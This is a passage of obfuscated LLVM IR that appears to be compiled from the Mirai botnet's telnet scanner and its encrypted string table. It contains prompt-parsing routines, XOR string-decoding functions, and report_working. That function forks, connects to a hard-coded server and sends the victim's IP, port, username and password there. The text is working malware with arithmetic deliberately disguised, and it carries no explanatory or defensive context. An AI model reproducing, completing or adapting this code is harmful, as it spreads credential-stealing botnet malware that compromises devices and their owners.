  br label %119

; <label>:100:                                    ; preds = %81
  %101 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %102 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %101, i32 0, i32 7
  %103 = getelementptr inbounds [256 x i8], [256 x i8]* %102, i32 0, i32 0
  %104 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %104, i32 0, i32 6
  %106 = load i32, i32* %105, align 4
  %107 = load i8*, i8** %10, align 8
  %108 = load i32, i32* %8, align 4
  %109 = add i32 %108, -790975609
  %110 = sub i32 %109, 1
  %111 = sub i32 %110, -790975609
  %112 = sub nsw i32 %108, 1
  %113 = call i32 @util_memsearch(i8* %103, i32 %106, i8* %107, i32 %111)
  %114 = icmp ne i32 %113, -1
  %115 = zext i1 %114 to i32
  store i32 %115, i32* %7, align 4
  br i1 %114, label %116, label %118

; <label>:116:                                    ; preds = %100
  %117 = load i32, i32* %7, align 4
  store i32 %117, i32* %6, align 4
  br label %118

; <label>:118:                                    ; preds = %116, %100
  br label %119

; <label>:119:                                    ; preds = %118, %98
  br label %120

; <label>:120:                                    ; preds = %119, %78
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %121 = load i32, i32* %6, align 4
  %122 = icmp eq i32 %121, -1
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %120
  store i32 0, i32* %2, align 4
  br label %126

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %6, align 4
  store i32 %125, i32* %2, align 4
  br label %126

; <label>:126:                                    ; preds = %124, %123
  %127 = load i32, i32* %2, align 4
  ret i32 %127
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub nsw i32 %12, 1
  store i32 %14, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %62, %1
  %17 = load i32, i32* %5, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %67

; <label>:19:                                     ; preds = %16
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 7
  %22 = load i32, i32* %5, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = icmp eq i32 %26, 58
  br i1 %27, label %55, label %28

; <label>:28:                                     ; preds = %19
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 62
  br i1 %36, label %55, label %37

; <label>:37:                                     ; preds = %28
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [256 x i8], [256 x i8]* %39, i64 0, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 36
  br i1 %45, label %55, label %46

; <label>:46:                                     ; preds = %37
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 7
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [256 x i8], [256 x i8]* %48, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = sext i8 %52 to i32
  %54 = icmp eq i32 %53, 35
  br i1 %54, label %55, label %61

; <label>:55:                                     ; preds = %46, %37, %28, %19
  %56 = load i32, i32* %5, align 4
  %57 = sub i32 %56, -1466644324
  %58 = add i32 %57, 1
  %59 = add i32 %58, -1466644324
  %60 = add nsw i32 %56, 1
  store i32 %59, i32* %6, align 4
  br label %67

; <label>:61:                                     ; preds = %46
  br label %62

; <label>:62:                                     ; preds = %61
  %63 = load i32, i32* %5, align 4
  %64 = sub i32 0, -1
  %65 = sub i32 %63, %64
  %66 = add nsw i32 %63, -1
  store i32 %65, i32* %5, align 4
  br label %16

; <label>:67:                                     ; preds = %55, %16
  %68 = load i32, i32* %6, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %89

; <label>:70:                                     ; preds = %67
  call void @table_unlock_val(i8 zeroext 25)
  %71 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %71, i8** %7, align 8
  %72 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %73 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %72, i32 0, i32 7
  %74 = getelementptr inbounds [256 x i8], [256 x i8]* %73, i32 0, i32 0
  %75 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %76 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %75, i32 0, i32 6
  %77 = load i32, i32* %76, align 4
  %78 = load i8*, i8** %7, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sub i32 0, 1
  %81 = add i32 %79, %80
  %82 = sub nsw i32 %79, 1
  %83 = call i32 @util_memsearch(i8* %74, i32 %77, i8* %78, i32 %81)
  %84 = icmp ne i32 %83, -1
  %85 = zext i1 %84 to i32
  store i32 %85, i32* %8, align 4
  br i1 %84, label %86, label %88

; <label>:86:                                     ; preds = %70
  %87 = load i32, i32* %8, align 4
  store i32 %87, i32* %6, align 4
  br label %88

; <label>:88:                                     ; preds = %86, %70
  br label %89

; <label>:89:                                     ; preds = %88, %67
  call void @table_lock_val(i8 zeroext 25)
  %90 = load i32, i32* %6, align 4
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %89
  store i32 0, i32* %2, align 4
  br label %95

; <label>:93:                                     ; preds = %89
  %94 = load i32, i32* %6, align 4
  store i32 %94, i32* %2, align 4
  br label %95

; <label>:95:                                     ; preds = %93, %92
  %96 = load i32, i32* %2, align 4
  ret i32 %96
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = add i32 %9, 1398969536
  %11 = sub i32 %10, 1
  %12 = sub i32 %11, 1398969536
  %13 = sub nsw i32 %9, 1
  store i32 %12, i32* %5, align 4
  br label %14

; <label>:14:                                     ; preds = %70, %1
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %17, label %75

; <label>:17:                                     ; preds = %14
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 58
  br i1 %25, label %62, label %26

; <label>:26:                                     ; preds = %17
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 7
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 62
  br i1 %34, label %62, label %35

; <label>:35:                                     ; preds = %26
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 36
  br i1 %43, label %62, label %44

; <label>:44:                                     ; preds = %35
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 7
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %46, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp eq i32 %51, 35
  br i1 %52, label %62, label %53

; <label>:53:                                     ; preds = %44
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 7
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %55, i64 0, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 37
  br i1 %61, label %62, label %69

; <label>:62:                                     ; preds = %53, %44, %35, %26, %17
  %63 = load i32, i32* %5, align 4
  %64 = sub i32 0, %63
  %65 = sub i32 0, 1
  %66 = add i32 %64, %65
  %67 = sub i32 0, %66
  %68 = add nsw i32 %63, 1
  store i32 %67, i32* %6, align 4
  br label %75

; <label>:69:                                     ; preds = %53
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %5, align 4
  %72 = sub i32 0, -1
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, -1
  store i32 %73, i32* %5, align 4
  br label %14

; <label>:75:                                     ; preds = %62, %14
  %76 = load i32, i32* %6, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %75
  store i32 0, i32* %2, align 4
  br label %81

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* %6, align 4
  store i32 %80, i32* %2, align 4
  br label %81

; <label>:81:                                     ; preds = %79, %78
  %82 = load i32, i32* %2, align 4
  ret i32 %82
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub i32 0, 1
  %17 = add i32 %15, %16
  %18 = sub nsw i32 %15, 1
  %19 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %17)
  %20 = icmp ne i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %42

; <label>:22:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %23 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %23, i8** %4, align 8
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 6
  %29 = load i32, i32* %28, align 4
  %30 = load i8*, i8** %4, align 8
  %31 = load i32, i32* %6, align 4
  %32 = sub i32 %31, -1198365159
  %33 = sub i32 %32, 1
  %34 = add i32 %33, -1198365159
  %35 = sub nsw i32 %31, 1
  %36 = call i32 @util_memsearch(i8* %26, i32 %29, i8* %30, i32 %34)
  store i32 %36, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %37 = load i32, i32* %5, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %22
  store i32 0, i32* %2, align 4
  br label %42

; <label>:40:                                     ; preds = %22
  %41 = load i32, i32* %5, align 4
  store i32 %41, i32* %2, align 4
  br label %42

; <label>:42:                                     ; preds = %40, %39, %21
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  br label %79

; <label>:19:                                     ; preds = %15
  %20 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  br label %23

; <label>:23:                                     ; preds = %22, %19
  call void @table_unlock_val(i8 zeroext 2)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call i32 @inet_addr(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.33, i32 0, i32 0)) #6
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = call i8* @table_retrieve_val(i32 2, i32* null)
  %29 = bitcast i8* %28 to i16*
  %30 = load i16, i16* %29, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  call void @table_lock_val(i8 zeroext 2)
  %32 = load i32, i32* %9, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %23
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @close(i32 %40)
  br label %42

; <label>:42:                                     ; preds = %39, %23
  store i8 0, i8* %11, align 1
  %43 = load i32, i32* %9, align 4
  %44 = call i64 @send(i32 %43, i8* %11, i64 1, i32 16384)
  %45 = load i32, i32* %9, align 4
  %46 = bitcast i32* %4 to i8*
  %47 = call i64 @send(i32 %45, i8* %46, i64 4, i32 16384)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast i16* %5 to i8*
  %50 = call i64 @send(i32 %48, i8* %49, i64 2, i32 16384)
  %51 = load i32, i32* %9, align 4
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 4
  %54 = call i64 @send(i32 %51, i8* %53, i64 1, i32 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %59, i32 0, i32 4
  %61 = load i8, i8* %60, align 4
  %62 = zext i8 %61 to i64
  %63 = call i64 @send(i32 %55, i8* %58, i64 %62, i32 16384)
  %64 = load i32, i32* %9, align 4
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %66 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %65, i32 0, i32 5
  %67 = call i64 @send(i32 %64, i8* %66, i64 1, i32 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 1
  %71 = load i8*, i8** %70, align 8
  %72 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i64
  %76 = call i64 @send(i32 %68, i8* %71, i64 %75, i32 16384)
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %42, %18
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add i32 %11, -678874168
  %13 = add i32 %12, 1
  %14 = sub i32 %13, -678874168
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = call noalias i8* @malloc(i64 %16) #6
  store i8* %17, i8** %6, align 8
  %18 = load i8*, i8** %6, align 8
  %19 = load i8*, i8** %3, align 8
  %20 = load i32*, i32** %4, align 8
  %21 = load i32, i32* %20, align 4
  %22 = sub i32 0, %21
  %23 = sub i32 0, 1
  %24 = add i32 %22, %23
  %25 = sub i32 0, %24
  %26 = add nsw i32 %21, 1
  call void @util_memcpy(i8* %18, i8* %19, i32 %25)
  store i32 0, i32* %5, align 4
  br label %27

; <label>:27:                                     ; preds = %100, %2
  %28 = load i32, i32* %5, align 4
  %29 = load i32*, i32** %4, align 8
  %30 = load i32, i32* %29, align 4
  %31 = icmp slt i32 %28, %30
  br i1 %31, label %32, label %106

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = xor i32 %38, -1
  %40 = and i32 929306312, %39
  %41 = xor i32 929306312, -1
  %42 = and i32 %38, %41
  %43 = xor i32 222, -1
  %44 = and i32 %43, 929306312
  %45 = and i32 222, %41
  %46 = or i32 %40, %42
  %47 = or i32 %44, %45
  %48 = xor i32 %46, %47
  %49 = xor i32 %38, 222
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %36, align 1
  %51 = load i8*, i8** %6, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, -1
  %58 = and i32 -1191998279, %57
  %59 = xor i32 -1191998279, -1
  %60 = and i32 %56, %59
  %61 = xor i32 222, -1
  %62 = and i32 %61, -1191998279
  %63 = and i32 222, %59
  %64 = or i32 %58, %60
  %65 = or i32 %62, %63
  %66 = xor i32 %64, %65
  %67 = xor i32 %56, 222
  %68 = trunc i32 %66 to i8
  store i8 %68, i8* %54, align 1
  %69 = load i8*, i8** %6, align 8
  %70 = load i32, i32* %5, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  %73 = load i8, i8* %72, align 1
  %74 = sext i8 %73 to i32
  %75 = xor i32 %74, -1
  %76 = and i32 251, %75
  %77 = xor i32 251, -1
  %78 = and i32 %74, %77
  %79 = or i32 %76, %78
  %80 = xor i32 %74, 251
  %81 = trunc i32 %79 to i8
  store i8 %81, i8* %72, align 1
  %82 = load i8*, i8** %6, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = xor i32 %87, -1
  %89 = and i32 697183283, %88
  %90 = xor i32 697183283, -1
  %91 = and i32 %87, %90
  %92 = xor i32 175, -1
  %93 = and i32 %92, 697183283
  %94 = and i32 175, %90
  %95 = or i32 %89, %91
  %96 = or i32 %93, %94
  %97 = xor i32 %95, %96
  %98 = xor i32 %87, 175
  %99 = trunc i32 %97 to i8
  store i8 %99, i8* %85, align 1
  br label %100

; <label>:100:                                    ; preds = %32
  %101 = load i32, i32* %5, align 4
  %102 = sub i32 %101, -1965605363
  %103 = add i32 %102, 1
  %104 = add i32 %103, -1965605363
  %105 = add nsw i32 %101, 1
  store i32 %104, i32* %5, align 4
  br label %27

; <label>:106:                                    ; preds = %27
  %107 = load i8*, i8** %6, align 8
  ret i8* %107
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 255, -1
  %15 = xor i32 1788792946, -1
  %16 = or i32 %13, %14
  %17 = or i32 1788792946, %15
  %18 = xor i32 %16, -1
  %19 = and i32 %18, %17
  %20 = and i32 %12, 255
  %21 = trunc i32 %19 to i8
  store i8 %21, i8* %5, align 1
  %22 = load i32, i32* @table_key, align 4
  %23 = lshr i32 %22, 8
  %24 = xor i32 255, -1
  %25 = xor i32 %23, %24
  %26 = and i32 %25, %23
  %27 = and i32 %23, 255
  %28 = trunc i32 %26 to i8
  store i8 %28, i8* %6, align 1
  %29 = load i32, i32* @table_key, align 4
  %30 = lshr i32 %29, 16
  %31 = xor i32 %30, -1
  %32 = xor i32 255, -1
  %33 = xor i32 -1191232677, -1
  %34 = or i32 %31, %32
  %35 = or i32 -1191232677, %33
  %36 = xor i32 %34, -1
  %37 = and i32 %36, %35
  %38 = and i32 %30, 255
  %39 = trunc i32 %37 to i8
  store i8 %39, i8* %7, align 1
  %40 = load i32, i32* @table_key, align 4
  %41 = lshr i32 %40, 24
  %42 = xor i32 255, -1
  %43 = xor i32 %41, %42
  %44 = and i32 %43, %41
  %45 = and i32 %41, 255
  %46 = trunc i32 %44 to i8
  store i8 %46, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %47

; <label>:47:                                     ; preds = %138, %1
  %48 = load i32, i32* %3, align 4
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 1
  %51 = load i16, i16* %50, align 8
  %52 = zext i16 %51 to i32
  %53 = icmp slt i32 %48, %52
  br i1 %53, label %54, label %144

; <label>:54:                                     ; preds = %47
  %55 = load i8, i8* %5, align 1
  %56 = zext i8 %55 to i32
  %57 = load %struct.table_value*, %struct.table_value** %4, align 8
  %58 = getelementptr inbounds %struct.table_value, %struct.table_value* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = load i32, i32* %3, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = xor i32 %64, -1
  %66 = and i32 %56, %65
  %67 = xor i32 %56, -1
  %68 = and i32 %64, %67
  %69 = or i32 %66, %68
  %70 = xor i32 %64, %56
  %71 = trunc i32 %69 to i8
  store i8 %71, i8* %62, align 1
  %72 = load i8, i8* %6, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, -1
  %83 = and i32 539380489, %82
  %84 = xor i32 539380489, -1
  %85 = and i32 %81, %84
  %86 = xor i32 %73, -1
  %87 = and i32 %86, 539380489
  %88 = and i32 %73, %84
  %89 = or i32 %83, %85
  %90 = or i32 %87, %88
  %91 = xor i32 %89, %90
  %92 = xor i32 %81, %73
